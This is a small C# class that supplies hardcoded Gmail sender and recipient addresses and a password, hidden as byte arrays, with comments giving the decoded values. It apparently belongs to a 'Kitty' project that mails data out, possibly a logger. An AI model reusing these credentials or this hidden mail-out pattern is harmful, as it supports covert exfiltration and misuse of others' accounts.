﻿namespace Kitty.Resources
{
    internal sealed class MainMailProvider : MailProvider
    {
        public override string FromAddress
        {
            get
            {
                // kitty0login@gmail.com
                byte[] from = new byte[] { 107, 105, 116, 116, 121, 48, 108, 111, 103, 105, 110, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109 };
                return GetStringFromBytes(from);
            }
        }

        public override string FromPassword
        {
            get
            {
                // I'm just a beginner
                byte[] from = new byte[] { 73, 39, 109, 32, 106, 117, 115, 116, 32, 97, 32, 98, 101, 103, 105, 110, 110, 101, 114 };
                return GetStringFromBytes(from);
            }
        }

        public override string ToAddress
        {
            get
            {
                // user: kitty0logout@gmail.com
                // pass: One free account gets you into everything Google.
                byte[] from = new byte[] { 107, 105, 116, 116, 121, 48, 108, 111, 103, 111, 117, 116, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109 };
                return GetStringFromBytes(from);
            }
        }
    }
}
